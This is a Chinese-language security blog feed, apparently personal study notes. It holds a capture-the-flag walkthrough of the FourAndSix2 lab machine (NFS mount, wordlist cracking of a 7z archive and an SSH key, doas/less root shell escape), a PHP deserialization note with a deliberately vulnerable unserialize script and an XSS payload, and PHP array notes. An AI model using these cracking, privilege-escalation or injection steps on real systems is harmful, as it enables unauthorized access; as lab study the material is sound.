<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://prontosil.club/"/>
  <updated>2019-07-30T15:01:18.808Z</updated>
  <id>https://prontosil.club/</id>
  
  <author>
    <name>百浪多息</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>靶机渗透</title>
    <link href="https://prontosil.club/2019/07/30/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://prontosil.club/2019/07/30/靶机渗透/</id>
    <published>2019-07-30T15:00:04.000Z</published>
    <updated>2019-07-30T15:01:18.808Z</updated>
    
    <content type="html"><![CDATA[<h2>fourandsix2靶机</h2><p>一开机就可以看到IP地址位192.168.41.132</p><p>然后nmap开始扫描<code>nmap -A -n -v -Pn -A 192.168.41.132</code>-A Enable OS detection, version detection, script scanning, and traceroute-n -n/-R: Never do DNS resolution/Always resolve [default: sometimes]-Pn  Treat all hosts as online -- skip host discovery</p><p>扫描的报告：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.41.132</span><br><span class="line">Host is up (0.00059s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)</span><br><span class="line">|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)</span><br><span class="line">|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)</span><br><span class="line">111/tcp  open  rpcbind 2 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100003  2,3         2049/tcp  nfs</span><br><span class="line">|   100003  2,3         2049/udp  nfs</span><br><span class="line">|   100005  1,3          780/udp  mountd</span><br><span class="line">|_  100005  1,3          917/tcp  mountd</span><br><span class="line">2049/tcp open  nfs     2-3 (RPC #100003)</span><br><span class="line">MAC Address: 00:0C:29:81:23:53 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: OpenBSD 6.X</span><br><span class="line">OS CPE: cpe:/o:openbsd:openbsd:6</span><br><span class="line">OS details: OpenBSD 6.0 - 6.1</span><br><span class="line">Uptime guess: 0.000 days (since Sat Jul 20 02:04:15 2019)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=258 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Randomized</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.59 ms 192.168.41.132</span><br></pre></td></tr></table></figure></p><p>难得一次nmap可以扫出这么多信息看到靶机开放了2049号端口，是nfs服务，那么尝试扫描可以挂载的目录</p><ul><li>-sV : Probe open ports to determine service/version info</li></ul><p><code>nmap -sV --script=nfs-showmount 192.168.41.132</code>扫描可以挂载的目录</p><p>结果：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)</span><br><span class="line">111/tcp  open  rpcbind 2 (RPC #100000)</span><br><span class="line">| nfs-showmount:</span><br><span class="line">|_  /home/user/storage</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100003  2,3         2049/tcp  nfs</span><br><span class="line">|   100003  2,3         2049/udp  nfs</span><br><span class="line">|   100005  1,3          780/udp  mountd</span><br><span class="line">|_  100005  1,3          917/tcp  mountd</span><br><span class="line">2049/tcp open  nfs     2-3 (RPC #100003)</span><br><span class="line">MAC Address: 00:0C:29:81:23:53 (VMware)</span><br></pre></td></tr></table></figure></p><p>很好，那就可以挂载目录了</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nfspysh -o server=192.168.41.132:/home/user/storage /tmp/test/</span><br><span class="line">nfspy@192.168.41.132:/home/user/storage:/&gt;</span><br></pre></td></tr></table></figure></p><p>nfspysh的用法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nfspysh -h</span><br><span class="line">Usage: nfspysh [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help  show this help message and exit</span><br><span class="line">  -l          List mount options available</span><br><span class="line">  -o OPTIONS  Mount options as in nfspy</span><br><span class="line">  -c COMMAND  Semicolon-separated commands to run (batch mode)</span><br></pre></td></tr></table></figure></p><p>目录下有一个压缩包<code>get backup.7z</code>然后尝试用7z去解压缩，但是有密码</p><p>于是用<code>john</code>去破解</p><p>然而爆破有点慢</p><p>不过密码就是<code>chocolate</code></p><p>ps.kali里面其实有很多字典的，比如<code>/usr/share/john/password.lst</code></p><p>解压缩之后得到的是一个公钥和私钥</p><p>通过下面这段脚本爆破出密码是12345678<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;user@192.168.41.132&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure></p><p>然后就可以登陆了<code>ssh -i id_rsa user@192.168.41.132</code></p><p>之前一直尝试没登陆成功，因为我忘记赋权了也就是<code>chmod 600 id_rsa</code></p><p>然后就可以登陆了：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# ssh -i id_rsa user@192.168.41.132</span><br><span class="line">Enter passphrase for key &apos;id_rsa&apos;:</span><br><span class="line">Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114</span><br><span class="line">OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018</span><br><span class="line"></span><br><span class="line">Welcome to OpenBSD: The proactively secure Unix-like operating system.</span><br><span class="line"></span><br><span class="line">Please use the sendbug(1) utility to report bugs in the system.</span><br><span class="line">Before reporting a bug, please try to reproduce it with the latest</span><br><span class="line">version of the code.  With bug reports, please try to ensure that</span><br><span class="line">enough information to reproduce the problem is enclosed, and if a</span><br><span class="line">known fix for it exists, include that as well.</span><br><span class="line"></span><br><span class="line">fourandsix2$</span><br></pre></td></tr></table></figure></p><p>如下是错误的做法：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# ssh -i id_rsa user@192.168.41.132</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0777 for &apos;id_rsa&apos; are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br></pre></td></tr></table></figure></p><p>登陆之后</p><p>没办法直接访问root文件夹<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2$ ls /root/</span><br><span class="line">ls: /root/: Permission denied</span><br></pre></td></tr></table></figure></p><p>接下来这波操作很不明白</p><p>输入<code>doas /usr/bin/less /var/log/authlog</code>然后按v进入编辑模式之后输入<code>:!/bin/sh</code></p><p><img src="https://i.imgur.com/rU9dNJP.png" alt="four"></p><p>于是就提权了</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><p>成功了</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fourandsix2# cat /root/flag.txt                                                                                                                                             </span><br><span class="line">Nice you hacked all the passwords!</span><br><span class="line"></span><br><span class="line">Not all tools worked well. But with some command magic...:</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p&quot;$line&quot; -oout; if grep -iRl SSH; then echo $line; break;fi;done</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P &quot;$line&quot; -N password -f id_rsa; then echo $line; break;fi;done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Here is the flag:</span><br><span class="line">acd043bc3103ed3dd02eee99d5b0ff42</span><br></pre></td></tr></table></figure></p><p>补充提权的过程：在<code>/etc/doas.conf</code>文件中有这些内容所以可以用<code>doas</code>命令查看<code>authlod</code>文件同时，通过编辑它，进入了shell</p><p><img src="https://i.imgur.com/iZC9p7A.png" alt="doas"></p><h1>参考</h1><p><a href="https://www.freebuf.com/articles/web/194783.html" target="_blank" rel="noopener">FourAndSix2.01靶机渗透</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;fourandsix2靶机&lt;/h2&gt;
&lt;p&gt;一开机就可以看到IP地址位192.168.41.132&lt;/p&gt;
&lt;p&gt;然后nmap开始扫描
&lt;code&gt;nmap -A -n -v -Pn -A 192.168.41.132&lt;/code&gt;
-A Enable OS detect
      
    
    </summary>
    
      <category term="vulstudy" scheme="https://prontosil.club/categories/vulstudy/"/>
    
    
      <category term="靶机" scheme="https://prontosil.club/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="nfs" scheme="https://prontosil.club/tags/nfs/"/>
    
      <category term="nmap" scheme="https://prontosil.club/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化笔记</title>
    <link href="https://prontosil.club/2019/07/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0/"/>
    <id>https://prontosil.club/2019/07/30/php反序列化笔记/</id>
    <published>2019-07-30T14:54:28.000Z</published>
    <updated>2019-07-30T14:56:08.639Z</updated>
    
    <content type="html"><![CDATA[<h1>php 反序列化</h1><p>先看一个栗子：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"pxy"</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">"secret"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">"20"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test1 = <span class="keyword">new</span> Test();</span><br><span class="line">$object = serialize($test1);</span><br><span class="line">print_r($object);</span><br></pre></td></tr></table></figure></p><p>序列化之后得到的结果是：<code>O:4:&quot;Test&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;pxy&quot;;s:9:&quot;Testsex&quot;;s:6:&quot;secret&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;}</code></p><p>O代表是对象，<code>Test</code>是类名，之后是属性，不同类型的属性其实序列化之后得到的结果是不一样的。</p><p>看官方文档，解释了为什么需要序列化这种操作：</p><blockquote><p>serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p></blockquote><p>同时提到了一个魔术方法：</p><blockquote><p>当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。</p></blockquote><p><code>__sleep()</code>和<code>__wakeup()</code>两个方法很形象地说明了什么时候调用。</p><p>然后我就犯了一个新手很常见的错误：<code>__sleep()</code>方法必须是要返回一个<code>array</code>地<img src="https://i.imgur.com/pulCMhV.png" alt="php3"></p><p>原来。。<code>__sleep()</code>方法是这样子调用的啊<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"pxy"</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">"secret"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">"20"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2>实际追踪一下为什么会出现反序列化</h2><p>调试代码如下:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $target = <span class="string">"this is a test"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$c = unserialize($a);</span><br></pre></td></tr></table></figure></p><p>利用思路：传入的参数是可控的，并且这里还有一个<code>test</code>类和一个<code>__destruct()</code>魔术方法。那就是构造这个对象将其序列化之后传入，之后会自动反序列化同时在对象销毁的时候就会自动执行魔术方法了</p><p>我们这样来写：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $target = <span class="string">"&lt;script&gt;alert('xss');&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line">print_r(serialize($object));</span><br></pre></td></tr></table></figure></p><p>突然觉得序列化也有一点变量覆盖的味道，我在外部构造的类实例化的对象进入代码之后覆盖了原来的对象？</p><p>调试过程如下：</p><p>生成的序列化字符串如下：<code>O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}</code>然后将其作为参数传入进去:</p><p><code>http://localhost/test/testUnserialize0.php?b=O:4:%22test%22:1:{s:6:%22target%22;s:30:%22%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E%22;}</code></p><p>此时接收到了参数：<img src="https://i.imgur.com/rbponzu.png" alt="php4"><code>$a</code>的值为：&quot;O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}&quot;</p><p>继续单步步入：这个时候就会去调用魔术方法了<img src="https://i.imgur.com/ozQZZiw.png" alt="php5"></p><p>xss框框就弹出来啦。<img src="https://i.imgur.com/W3TNDdl.png" alt="xss3"></p><p>接下来继续研究剩下的魔术方法：先看几个简单的</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'P2hm1n'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct()\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct()\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup()\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString()"</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep()\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($funName, $argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"调用方法"</span>.$funName.<span class="string">"(:"</span>.<span class="string">"参数:"</span>;</span><br><span class="line">        print_r($argument);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"不存在！\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($funName, $argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"调用静态方法"</span>.$funName.<span class="string">"(:"</span>.<span class="string">"参数:"</span>;</span><br><span class="line">        print_r($argument);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"不存在！\n"</span>;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test1 = <span class="keyword">new</span> test();</span><br><span class="line">test::hello(<span class="string">"nihao"</span>); <span class="comment">//不实例化对象，此时调用的是静态方法</span></span><br><span class="line">$test1-&gt;hello(<span class="string">"nihao"</span>); <span class="comment">//实例化对象</span></span><br><span class="line">$test2 = serialize($test1);</span><br><span class="line"></span><br><span class="line">$test3 = unserialize($test2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>($test3);</span><br></pre></td></tr></table></figure></p><p>输出的结果如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">调用静态方法hello(:参数:Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; nihao</span><br><span class="line">)</span><br><span class="line">不存在！</span><br><span class="line">调用方法hello(:参数:Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; nihao</span><br><span class="line">)</span><br><span class="line">不存在！</span><br><span class="line">__sleep()</span><br><span class="line">__wakeup()</span><br><span class="line">__toString()</span><br><span class="line">__destruct()</span><br><span class="line">__destruct()</span><br></pre></td></tr></table></figure></p><p>这几个方法都还挺好区分的，比较难区分的就是<code>__call()</code>和<code>__callStatic()</code>方法了。</p><p>TODO<a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">十六个魔术方法详解</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;php 反序列化&lt;/h1&gt;
&lt;p&gt;先看一个栗子：
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php-manual-note-0</title>
    <link href="https://prontosil.club/2019/07/30/php-manual-note-0/"/>
    <id>https://prontosil.club/2019/07/30/php-manual-note-0/</id>
    <published>2019-07-30T14:52:59.000Z</published>
    <updated>2019-07-30T14:53:43.200Z</updated>
    
    <content type="html"><![CDATA[<h1>php doc阅读笔记0</h1><h2>array</h2><p>数组是php的key=&gt;value映射key只能是<code>integer</code>和<code>string</code>类型，value可以是任意类型</p><p>所以key会有如下强制转换：</p><ul><li>包含有合法整型值的字符串会被转换为整型。例如键名 &quot;8&quot; 实际会被储存为 8。但是 &quot;08&quot; 则不会强制转换，因为其不是一个合法的十进制数值。</li><li>浮点数也会被转换为整型，意味着其小数部分会被舍去。例如键名 8.7 实际会被储存为 8。</li><li>布尔值也会被转换成整型。即键名 true 实际会被储存为 1 而键名 false 会被储存为 0。</li><li>Null 会被转换为空字符串，即键名 null 实际会被储存为 &quot;&quot;。</li><li>数组和对象不能被用为键名。坚持这么做会导致警告：Illegal offset type。</li></ul><p>比如官方举例如下：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">  <span class="number">1</span>    =&gt; <span class="string">"a"</span>,</span><br><span class="line">  <span class="string">"1"</span>  =&gt; <span class="string">"b"</span>,</span><br><span class="line">  <span class="number">1.5</span>  =&gt; <span class="string">"c"</span>,</span><br><span class="line">  <span class="keyword">true</span> =&gt; <span class="string">"d"</span>,</span><br><span class="line">);</span><br><span class="line">var_dump($array);</span><br></pre></td></tr></table></figure></p><p>输出如下：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(1) &quot;d&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>会导致数组的一部分值被覆盖掉</p><blockquote><p>上例中所有的键名都被强制转换为 1，则每一个新单元都会覆盖前一个的值，最后剩下的只有一个 &quot;d&quot;。</p></blockquote><p>同时：</p><blockquote><p>key 为可选项。如果未指定，PHP 将自动使用之前用过的最大 integer 键名加上 1 作为新的键名。</p></blockquote><p>那就会有这种结果：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">"a"</span>,</span><br><span class="line">  <span class="string">"b"</span>,</span><br><span class="line"><span class="number">6</span> =&gt; <span class="string">"c"</span>,</span><br><span class="line">  <span class="string">"d"</span>,</span><br><span class="line">);</span><br><span class="line">var_dump($array);</span><br></pre></td></tr></table></figure></p><p>输出为：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  string(1) &quot;a&quot;</span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(1) &quot;b&quot;</span><br><span class="line">  [6] =&gt;</span><br><span class="line">  string(1) &quot;c&quot;</span><br><span class="line">  [7] =&gt;</span><br><span class="line">  string(1) &quot;d&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3>神奇的解引用语法</h3><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span 